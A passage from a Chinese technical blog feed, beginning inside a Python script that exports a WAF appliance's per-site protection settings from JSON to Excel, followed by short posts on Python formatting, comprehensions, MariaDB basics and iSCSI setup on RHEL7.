class="number">0</span>, <span class="number">6</span>, <span class="string">&#x27;验证名单&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">7</span>, <span class="string">&#x27;websocket路径&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">8</span>, <span class="string">&#x27;配置文件名称&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">9</span>, <span class="string">&#x27;是否防护&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">10</span>, <span class="string">&#x27;后端服务器&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">11</span>, <span class="string">&#x27;是否https协议&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&#x27;IP白名单&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">13</span>, <span class="string">&#x27;IP黑名单&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">14</span>, <span class="string">&#x27;是否关闭测试页面&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">15</span>, <span class="string">&#x27;reload状态码&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">16</span>, <span class="string">&#x27;WAF是否监控&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">17</span>, <span class="string">&#x27;RAS版本&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">18</span>, <span class="string">&#x27;RAS指纹&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">19</span>, <span class="string">&#x27;IP保护模式&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">20</span>, <span class="string">&#x27;IP白名单个数&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">21</span>, <span class="string">&#x27;IP黑名单个数&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">22</span>, <span class="string">&#x27;请求白名单个数&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">23</span>, <span class="string">&#x27;响应白名单个数&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">24</span>, <span class="string">&#x27;WAF白名单个数&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">25</span>, <span class="string">&#x27;websocket路径个数&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">26</span>, <span class="string">&#x27;自动化工具拦截&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">27</span>, <span class="string">&#x27;破解行为拦截&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">28</span>, <span class="string">&#x27;WAF模块&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">29</span>, <span class="string">&#x27;App防护&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">30</span>, <span class="string">&#x27;web标准保护&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">31</span>, <span class="string">&#x27;web高级保护&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">32</span>, <span class="string">&#x27;命令执行&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">33</span>, <span class="string">&#x27;文件上传&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">34</span>, <span class="string">&#x27;java反序列化&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">35</span>, <span class="string">&#x27;本地文件包含&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">36</span>, <span class="string">&#x27;php注入&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">37</span>, <span class="string">&#x27;协议攻击&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">38</span>, <span class="string">&#x27;远程文件包含&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">39</span>, <span class="string">&#x27;扫描探测&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">40</span>, <span class="string">&#x27;固定会话&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">41</span>, <span class="string">&#x27;SQL注入&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">42</span>, <span class="string">&#x27;XSS&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;XX.json&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = json.load(f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将json字典写入excel</span></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line">usefuldata=data[<span class="string">&#x27;system_settings&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>][<span class="string">&#x27;nginx&#x27;</span>][<span class="string">&#x27;upstreams&#x27;</span>] <span class="comment">#各系统配置详情</span></span><br><span class="line">ip_black=data[<span class="string">&#x27;system_settings&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>][<span class="string">&#x27;ip_black&#x27;</span>][<span class="string">&#x27;value&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>] <span class="comment">#IP黑名单</span></span><br><span class="line">sphinx_version=data[<span class="string">&#x27;sphinx_version&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>] <span class="comment">#版本</span></span><br><span class="line">certFp=data[<span class="string">&#x27;system_settings&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>][<span class="string">&#x27;cluster&#x27;</span>][<span class="string">&#x27;mobile&#x27;</span>][<span class="string">&#x27;certFp&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>] <span class="keyword">if</span> <span class="string">&#x27;certFp&#x27;</span> <span class="keyword">in</span> data[<span class="string">&#x27;system_settings&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>][<span class="string">&#x27;cluster&#x27;</span>][<span class="string">&#x27;mobile&#x27;</span>] <span class="keyword">else</span> <span class="string">&quot;&quot;</span><span class="comment">#指纹</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> list_item <span class="keyword">in</span> usefuldata:</span><br><span class="line">    <span class="comment"># print(list_item) #打印站点名</span></span><br><span class="line">    protect_list=usefuldata[list_item][<span class="string">&#x27;protected_list&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>] <span class="comment">#防护模块</span></span><br><span class="line">    EncapsulationListOut=usefuldata[list_item][<span class="string">&#x27;EncapsulationListOut&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>] <span class="comment">#封装名单</span></span><br><span class="line">    FullWhiteList=usefuldata[list_item][<span class="string">&#x27;FullWhiteList&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>] <span class="comment">#请求白名单</span></span><br><span class="line">    FullWhiteListOut=usefuldata[list_item][<span class="string">&#x27;FullWhiteListOut&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>] <span class="comment">#响应白名单</span></span><br><span class="line">    Inject_Whitelist=usefuldata[list_item][<span class="string">&#x27;Inject_Whitelist&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>] <span class="comment">#WAF白名单</span></span><br><span class="line">    VerificationList=usefuldata[list_item][<span class="string">&#x27;VerificationList&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>] <span class="comment">#验证名单</span></span><br><span class="line">    WafEnabledModules=usefuldata[list_item][<span class="string">&#x27;WafEnabledModules&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>] <span class="keyword">if</span> <span class="string">&#x27;WafEnabledModules&#x27;</span> <span class="keyword">in</span> usefuldata[list_item] <span class="keyword">else</span> &#123;&#125; <span class="comment">#WAF模块</span></span><br><span class="line">    site_customize_name=usefuldata[list_item][<span class="string">&#x27;site_customize_name&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>] <span class="comment">#系统名称</span></span><br><span class="line">    websocket_paths=usefuldata[list_item][<span class="string">&#x27;websocket_paths&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>] <span class="keyword">if</span> <span class="string">&#x27;websocket_paths&#x27;</span> <span class="keyword">in</span> usefuldata[list_item] <span class="keyword">else</span> <span class="string">&quot;&quot;</span> <span class="comment">#websocket路径</span></span><br><span class="line">    istrue=usefuldata[list_item][<span class="string">&#x27;enabled&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>] <span class="comment">#是否防护</span></span><br><span class="line">    UpstreamList=usefuldata[list_item][<span class="string">&#x27;UpstreamList&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>] <span class="comment">#后端服务器</span></span><br><span class="line">    IsUpstreamHttps=usefuldata[list_item][<span class="string">&#x27;IsUpstreamHttps&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>] <span class="comment">#是否https协议</span></span><br><span class="line">    IpWhiteList=usefuldata[list_item][<span class="string">&#x27;IpWhiteList&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>] <span class="comment">#IP白名单</span></span><br><span class="line">    disable_123456=usefuldata[list_item][<span class="string">&#x27;disable_123456&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>] <span class="keyword">if</span> <span class="string">&#x27;disable_123456&#x27;</span> <span class="keyword">in</span> usefuldata[list_item] <span class="keyword">else</span> <span class="string">&quot;&quot;</span> <span class="comment">#是否关闭测试页面</span></span><br><span class="line">    reload_status_code=usefuldata[list_item][<span class="string">&#x27;reload_status_code&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>] <span class="keyword">if</span> <span class="string">&#x27;reload_status_code&#x27;</span> <span class="keyword">in</span> usefuldata[list_item] <span class="keyword">else</span> <span class="string">&quot;&quot;</span> <span class="comment">#reload状态码</span></span><br><span class="line">    waf_learning_mode=usefuldata[list_item][<span class="string">&#x27;waf_learning_mode&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>] <span class="comment">#WAF是否监控</span></span><br><span class="line">    IpListSwitch=usefuldata[list_item][<span class="string">&#x27;IpListSwitch&#x27;</span>][<span class="string">&#x27;_value&#x27;</span>] <span class="comment">#IP保护模式</span></span><br><span class="line">    len_IpWhiteList=<span class="built_in">len</span>(IpWhiteList) <span class="comment">#IP白名单个数</span></span><br><span class="line">    len_ip_black=<span class="built_in">len</span>(ip_black) <span class="comment">#IP黑名单个数</span></span><br><span class="line">    len_FullWhiteList=<span class="built_in">len</span>(FullWhiteList) <span class="comment">#请求白名单个数</span></span><br><span class="line">    len_FullWhiteListOut=<span class="built_in">len</span>(FullWhiteListOut) <span class="comment">#响应白名单个数</span></span><br><span class="line">    len_Inject_Whitelist=<span class="built_in">len</span>(Inject_Whitelist) <span class="comment">#WAF白名单个数</span></span><br><span class="line">    len_websocket_paths=<span class="built_in">len</span>(websocket_paths) <span class="comment">#websocket路径个数</span></span><br><span class="line">    automated_tool_intercept=protect_list[<span class="string">&#x27;automated_tool_intercept&#x27;</span>] <span class="comment">#自动化工具拦截</span></span><br><span class="line">    crack_behavior_interception=protect_list[<span class="string">&#x27;crack_behavior_interception&#x27;</span>] <span class="comment">#破解行为拦截</span></span><br><span class="line">    injection_attack_interception=protect_list[<span class="string">&#x27;injection_attack_interception&#x27;</span>] <span class="comment">#WAF模块</span></span><br><span class="line">    mobile_sdk_protection=protect_list[<span class="string">&#x27;mobile_sdk_protection&#x27;</span>] <span class="comment">#App防护</span></span><br><span class="line">    web_standard_protection=protect_list[<span class="string">&#x27;web_standard_protection&#x27;</span>] <span class="comment">#web标准保护</span></span><br><span class="line">    web_advanced_protection=protect_list[<span class="string">&#x27;web_advanced_protection&#x27;</span>] <span class="comment">#web高级保护</span></span><br><span class="line">    command_excute_interception=WafEnabledModules[<span class="string">&#x27;command_excute_interception&#x27;</span>] <span class="keyword">if</span> <span class="string">&#x27;command_excute_interception&#x27;</span> <span class="keyword">in</span> WafEnabledModules <span class="keyword">else</span> <span class="string">&quot;&quot;</span> <span class="comment">#命令执行</span></span><br><span class="line">    file_upload_interception=WafEnabledModules[<span class="string">&#x27;file_upload_interception&#x27;</span>] <span class="keyword">if</span> <span class="string">&#x27;file_upload_interception&#x27;</span> <span class="keyword">in</span> WafEnabledModules <span class="keyword">else</span> <span class="string">&quot;&quot;</span> <span class="comment">#文件上传</span></span><br><span class="line">    java_deserialization_interception=WafEnabledModules[<span class="string">&#x27;java_deserialization_interception&#x27;</span>] <span class="keyword">if</span> <span class="string">&#x27;java_deserialization_interception&#x27;</span> <span class="keyword">in</span> WafEnabledModules <span class="keyword">else</span> <span class="string">&quot;&quot;</span> <span class="comment">#java反序列化</span></span><br><span class="line">    local_file_include_interception=WafEnabledModules[<span class="string">&#x27;local_file_include_interception&#x27;</span>] <span class="keyword">if</span> <span class="string">&#x27;local_file_include_interception&#x27;</span> <span class="keyword">in</span> WafEnabledModules <span class="keyword">else</span> <span class="string">&quot;&quot;</span> <span class="comment">#本地文件包含</span></span><br><span class="line">    php_injection_interception=WafEnabledModules[<span class="string">&#x27;php_injection_interception&#x27;</span>] <span class="keyword">if</span> <span class="string">&#x27;php_injection_interception&#x27;</span> <span class="keyword">in</span> WafEnabledModules <span class="keyword">else</span> <span class="string">&quot;&quot;</span> <span class="comment">#php注入</span></span><br><span class="line">    protocol_attack_interception=WafEnabledModules[<span class="string">&#x27;protocol_attack_interception&#x27;</span>] <span class="keyword">if</span> <span class="string">&#x27;protocol_attack_interception&#x27;</span> <span class="keyword">in</span> WafEnabledModules <span class="keyword">else</span> <span class="string">&quot;&quot;</span> <span class="comment">#协议攻击</span></span><br><span class="line">    remote_file_include_interception=WafEnabledModules[<span class="string">&#x27;remote_file_include_interception&#x27;</span>] <span class="keyword">if</span> <span class="string">&#x27;remote_file_include_interception&#x27;</span> <span class="keyword">in</span> WafEnabledModules <span class="keyword">else</span> <span class="string">&quot;&quot;</span> <span class="comment">#远程文件包含</span></span><br><span class="line">    scanner_detect_interception=WafEnabledModules[<span class="string">&#x27;scanner_detect_interception&#x27;</span>] <span class="keyword">if</span> <span class="string">&#x27;scanner_detect_interception&#x27;</span> <span class="keyword">in</span> WafEnabledModules <span class="keyword">else</span> <span class="string">&quot;&quot;</span> <span class="comment">#扫描探测</span></span><br><span class="line">    session_fixation_interception=WafEnabledModules[<span class="string">&#x27;session_fixation_interception&#x27;</span>] <span class="keyword">if</span> <span class="string">&#x27;session_fixation_interception&#x27;</span> <span class="keyword">in</span> WafEnabledModules <span class="keyword">else</span> <span class="string">&quot;&quot;</span> <span class="comment">#固定会话</span></span><br><span class="line">    sql_injection_interception=WafEnabledModules[<span class="string">&#x27;sql_injection_interception&#x27;</span>] <span class="keyword">if</span> <span class="string">&#x27;sql_injection_interception&#x27;</span> <span class="keyword">in</span> WafEnabledModules <span class="keyword">else</span> <span class="string">&quot;&quot;</span> <span class="comment">#sql注入</span></span><br><span class="line">    xss_injection_interception=WafEnabledModules[<span class="string">&#x27;xss_injection_interception&#x27;</span>] <span class="keyword">if</span> <span class="string">&#x27;xss_injection_interception&#x27;</span> <span class="keyword">in</span> WafEnabledModules <span class="keyword">else</span> <span class="string">&quot;&quot;</span> <span class="comment">#XSS</span></span><br><span class="line"></span><br><span class="line">    sheet.write(n,<span class="number">0</span>,<span class="string">&#x27;XX&#x27;</span>) <span class="comment">#所属集群</span></span><br><span class="line">    sheet.write(n,<span class="number">1</span>,<span class="built_in">str</span>(site_customize_name)) <span class="comment">#系统名称</span></span><br><span class="line">    sheet.write(n,<span class="number">2</span>,<span class="built_in">str</span>(FullWhiteList)) <span class="comment">#请求白名单</span></span><br><span class="line">    sheet.write(n,<span class="number">3</span>,<span class="built_in">str</span>(FullWhiteListOut)) <span class="comment">#响应白名单</span></span><br><span class="line">    sheet.write(n,<span class="number">4</span>,<span class="built_in">str</span>(Inject_Whitelist)) <span class="comment">#WAF白名单</span></span><br><span class="line">    sheet.write(n,<span class="number">5</span>,<span class="built_in">str</span>(EncapsulationListOut)) <span class="comment">#封装名单</span></span><br><span class="line">    sheet.write(n,<span class="number">6</span>,<span class="built_in">str</span>(VerificationList)) <span class="comment">#验证名单</span></span><br><span class="line">    sheet.write(n,<span class="number">7</span>,<span class="built_in">str</span>(websocket_paths)) <span class="comment">#websocket路径</span></span><br><span class="line">    sheet.write(n,<span class="number">8</span>,<span class="built_in">str</span>(list_item)) <span class="comment">#配置文件名称</span></span><br><span class="line">    sheet.write(n,<span class="number">9</span>,<span class="built_in">str</span>(istrue)) <span class="comment">#是否防护</span></span><br><span class="line">    sheet.write(n,<span class="number">10</span>,<span class="built_in">str</span>(UpstreamList)) <span class="comment">#后端服务器</span></span><br><span class="line">    sheet.write(n,<span class="number">11</span>,<span class="built_in">str</span>(IsUpstreamHttps)) <span class="comment">#是否https协议</span></span><br><span class="line">    sheet.write(n,<span class="number">12</span>,<span class="built_in">str</span>(IpWhiteList)) <span class="comment">#IP白名单</span></span><br><span class="line">    sheet.write(n,<span class="number">13</span>,<span class="built_in">str</span>(ip_black)) <span class="comment">#IP黑名单</span></span><br><span class="line">    sheet.write(n,<span class="number">14</span>,<span class="built_in">str</span>(disable_123456)) <span class="comment">#是否关闭测试页面</span></span><br><span class="line">    sheet.write(n,<span class="number">15</span>,<span class="built_in">str</span>(reload_status_code)) <span class="comment">#reload状态码</span></span><br><span class="line">    sheet.write(n,<span class="number">16</span>,<span class="built_in">str</span>(waf_learning_mode)) <span class="comment">#WAF是否监控</span></span><br><span class="line">    sheet.write(n,<span class="number">17</span>,<span class="built_in">str</span>(sphinx_version)) <span class="comment">#RAS版本</span></span><br><span class="line">    sheet.write(n,<span class="number">18</span>,<span class="built_in">str</span>(certFp)) <span class="comment">#RAS指纹</span></span><br><span class="line">    sheet.write(n,<span class="number">19</span>,<span class="built_in">str</span>(IpListSwitch)) <span class="comment">#IP保护模式</span></span><br><span class="line">    sheet.write(n,<span class="number">20</span>,<span class="built_in">str</span>(len_IpWhiteList)) <span class="comment">#IP白名单个数</span></span><br><span class="line">    sheet.write(n,<span class="number">21</span>,<span class="built_in">str</span>(len_ip_black)) <span class="comment">#IP黑名单个数</span></span><br><span class="line">    sheet.write(n,<span class="number">22</span>,<span class="built_in">str</span>(len_FullWhiteList)) <span class="comment">#请求白名单个数</span></span><br><span class="line">    sheet.write(n,<span class="number">23</span>,<span class="built_in">str</span>(len_FullWhiteListOut)) <span class="comment">#响应白名单个数</span></span><br><span class="line">    sheet.write(n,<span class="number">24</span>,<span class="built_in">str</span>(len_Inject_Whitelist)) <span class="comment">#WAF白名单个数</span></span><br><span class="line">    sheet.write(n,<span class="number">25</span>,<span class="built_in">str</span>(len_websocket_paths)) <span class="comment">#websocket路径个数</span></span><br><span class="line">    sheet.write(n,<span class="number">26</span>,<span class="built_in">str</span>(automated_tool_intercept)) <span class="comment">#自动化工具拦截</span></span><br><span class="line">    sheet.write(n,<span class="number">27</span>,<span class="built_in">str</span>(crack_behavior_interception)) <span class="comment">#破解行为拦截</span></span><br><span class="line">    sheet.write(n,<span class="number">28</span>,<span class="built_in">str</span>(injection_attack_interception)) <span class="comment">#WAF模块</span></span><br><span class="line">    sheet.write(n,<span class="number">29</span>,<span class="built_in">str</span>(mobile_sdk_protection)) <span class="comment">#App防护</span></span><br><span class="line">    sheet.write(n,<span class="number">30</span>,<span class="built_in">str</span>(web_standard_protection)) <span class="comment">#web标准保护</span></span><br><span class="line">    sheet.write(n,<span class="number">31</span>,<span class="built_in">str</span>(web_advanced_protection)) <span class="comment">#web高级保护</span></span><br><span class="line">    sheet.write(n,<span class="number">32</span>,<span class="built_in">str</span>(command_excute_interception)) <span class="comment">#命令执行</span></span><br><span class="line">    sheet.write(n,<span class="number">33</span>,<span class="built_in">str</span>(file_upload_interception)) <span class="comment">#文件上传</span></span><br><span class="line">    sheet.write(n,<span class="number">34</span>,<span class="built_in">str</span>(java_deserialization_interception)) <span class="comment">#java反序列化</span></span><br><span class="line">    sheet.write(n,<span class="number">35</span>,<span class="built_in">str</span>(local_file_include_interception)) <span class="comment">#本地文件包含</span></span><br><span class="line">    sheet.write(n,<span class="number">36</span>,<span class="built_in">str</span>(php_injection_interception)) <span class="comment">#php注入</span></span><br><span class="line">    sheet.write(n,<span class="number">37</span>,<span class="built_in">str</span>(protocol_attack_interception)) <span class="comment">#协议攻击</span></span><br><span class="line">    sheet.write(n,<span class="number">38</span>,<span class="built_in">str</span>(remote_file_include_interception)) <span class="comment">#远程文件包含</span></span><br><span class="line">    sheet.write(n,<span class="number">39</span>,<span class="built_in">str</span>(scanner_detect_interception)) <span class="comment">#扫描探测</span></span><br><span class="line">    sheet.write(n,<span class="number">40</span>,<span class="built_in">str</span>(session_fixation_interception)) <span class="comment">#固定会话</span></span><br><span class="line">    sheet.write(n,<span class="number">41</span>,<span class="built_in">str</span>(sql_injection_interception)) <span class="comment">#sql注入</span></span><br><span class="line">    sheet.write(n,<span class="number">42</span>,<span class="built_in">str</span>(xss_injection_interception)) <span class="comment">#XSS</span></span><br><span class="line"></span><br><span class="line">    n=n+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">book.save(<span class="string">&#x27;XX.xls&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>分析：主要思路就是，把大字典转换为小字典，遍历小字典，获取自己所需的键值。<br>注意：</p>
<ol>
<li>字典不存在的情况，需要设置空字典<code>&#123;&#125;</code>，否则报错。</li>
<li>键不存在的情况，需要设置空值<code>&quot;&quot;</code>，否则报错。<br>主要用到的知识也很简单，–怎么获取字典键值–，此处采取了较为简洁的方式：<code>value=dict[&#39;key&#39;]</code>。<br>需要重点注意的就是数据类型，是字典还是列表？最终存入excel的数据必须是字符类型。<code>str()</code>是做数据类型强制转换，转换为字符。</li>
</ol>
]]></content>
      <categories>
        <category>python脚本</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>读取复杂json</tag>
        <tag>取值</tag>
      </tags>
  </entry>
  <entry>
    <title>python零碎知识之format</title>
    <url>//posts/ZH-CN/Python_Format.html</url>
    <content><![CDATA[<h2 id="format格式化"><a href="#format格式化" class="headerlink" title="format格式化"></a>format格式化</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&#123;&#125;,how are &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;you&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>.format搭配大括号{}使用，可以将任何格式的内容填入format里面。format就是个大筐筐，什么都能往里装。</p>
]]></content>
      <categories>
        <category>聚沙成塔：python零碎</category>
      </categories>
      <tags>
        <tag>python零碎知识</tag>
        <tag>format格式</tag>
      </tags>
  </entry>
  <entry>
    <title>python零碎知识之推导式-扁平胜于嵌套</title>
    <url>//posts/ZH-CN/Python_Comprehension.html</url>
    <content><![CDATA[<h2 id="推导式"><a href="#推导式" class="headerlink" title="推导式"></a>推导式</h2><h3 id="列表推导式"><a href="#列表推导式" class="headerlink" title="列表推导式"></a>列表推导式</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br></pre></td></tr></table></figure>
<p>等价于</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
<p>运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0puqyvhvj30i8033gli.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape></p>
<h3 id="字典推导式"><a href="#字典推导式" class="headerlink" title="字典推导式"></a>字典推导式</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;i:i+<span class="number">10</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0pvbjiy6j30q202u3yh.jpg" alt="image.png"></p>
]]></content>
      <categories>
        <category>聚沙成塔：python零碎</category>
      </categories>
      <tags>
        <tag>python零碎知识</tag>
        <tag>推导式</tag>
      </tags>
  </entry>
  <entry>
    <title>redhat7中mariadb的简单使用</title>
    <url>//posts/ZH-CN/redhat7-mariadb-usage.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>redhat7默认的数据库是mariadb，使用语法与mysql一致。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="mariadb的简单使用"><a href="#mariadb的简单使用" class="headerlink" title="mariadb的简单使用"></a>mariadb的简单使用</h2><ol>
<li>安装mariadb并开启服务<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install mariadb mariadb-server</span><br><span class="line">systemctl restart mariadb</span><br><span class="line">systemctl enable mariadb</span><br></pre></td></tr></table></figure></li>
<li>数据库初始化，注意过程中会设置root密码。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure></li>
<li>登录到root用户的数据库<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>
进入数据库命令行：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; show databases; #查看当前的数据库</span><br><span class="line">MariaDB [(none)]&gt; set password = password(&#x27;linuxprobe&#x27;); #修改root密码</span><br><span class="line">MariaDB [(none)]&gt; create user edge@localhost identified by &#x27;redhat&#x27;; #新建用户edge，密码为redhat</span><br><span class="line">MariaDB [(none)]&gt; grant select,update,delete,insert on mysql.* to edge@localhost; #给edge用户授予权限，可对root用户的数据库进行增删查改</span><br><span class="line">MariaDB [(none)]&gt; revoke select,update,delete,insert on mysql.* from edge@localhost; #给edge用户取消权限，该用户将无法看到root用户的数据库</span><br><span class="line">MariaDB [(none)]&gt; create database linuxprobe; #创建数据库linuxprobe</span><br><span class="line">MariaDB [(none)]&gt; use linuxprobe; #进入数据库linuxprobe</span><br><span class="line">MariaDB [(none)]&gt; create table mybook(name char(15),price int,pages int); #创建数据表mybook</span><br><span class="line">MariaDB [(none)]&gt; describe mybook; #查看数据表mybook的字段结构</span><br><span class="line">MariaDB [(none)]&gt; insert into mybook (name,price,pages) values(&#x27;linuxprobe&#x27;,&#x27;50&#x27;,&#x27;300&#x27;); #向数据表mybook中插入数据</span><br><span class="line">MariaDB [(none)]&gt; update mybook set price=300; #更改数据表的price字段，设置为30</span><br><span class="line">MariaDB [(none)]&gt; delete from mybook; #删除数据表mybook的数据内容</span><br><span class="line">MariaDB [(none)]&gt; select * from mybook; #查询数据表mybook的所有数据 </span><br><span class="line">MariaDB [(none)]&gt; select name,price from mybook where price=30; #条件查询，查询price字段值为30的数据</span><br><span class="line">MariaDB [(none)]&gt; drop table mybook; #删除数据表mybook</span><br></pre></td></tr></table></figure>
</li>
</ol>
<hr>
<p><code>delete from mybook</code>与<code>drop table mybook</code>的区别：delete是清空数据表里面的数据，数据表结构还在；但是drop是直接把数据表销毁，数据表结构也不在了。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/12/imagee9e6a6785f528631.png" alt="imagee9e6a6785f528631.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/12/image3313aa102c23da8f.png" alt="image3313aa102c23da8f.png"><br>4. 数据库备份与恢复</p>
<ul>
<li>数据库备份<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqldump -u root -p linuxprobe &gt;  haha.dump</span><br></pre></td></tr></table></figure></li>
<li>数据库恢复<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p linuxprobe &lt; haha.dump</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>RHCE</category>
      </categories>
      <tags>
        <tag>redhat7</tag>
        <tag>mariadb</tag>
      </tags>
  </entry>
  <entry>
    <title>redhat7使用iSCSI部署网络存储</title>
    <url>//posts/ZH-CN/rehat7-iSCSI-network-store.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>两台电脑之间传输数据，最简单快速的方式，把硬盘拆下来，用iSCSI接口转接，将硬盘变成移动硬盘。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="服务端部署iSCSI"><a href="#服务端部署iSCSI" class="headerlink" title="服务端部署iSCSI"></a>服务端部署iSCSI</h2><p>服务端IP地址：192.168.0.106</p>
<ol>
<li>服务端新增4块硬盘，创建raid10磁盘阵列<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image6082175f65c8f591.png" alt="image6082175f65c8f591.png"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mdadm -Cv /dev/md0 -n 4 -l 10 /dev/sd[b-e] #创建raid10阵列</span><br><span class="line">mdadm -D /dev/md0 #检查磁盘阵列初始化是否完成</span><br></pre></td></tr></table></figure>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image9bf4838232ce93ff.png" alt="image9bf4838232ce93ff.png"></li>
<li>安装target、tarfetd<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install targetd targetcli</span><br></pre></td></tr></table></figure></li>
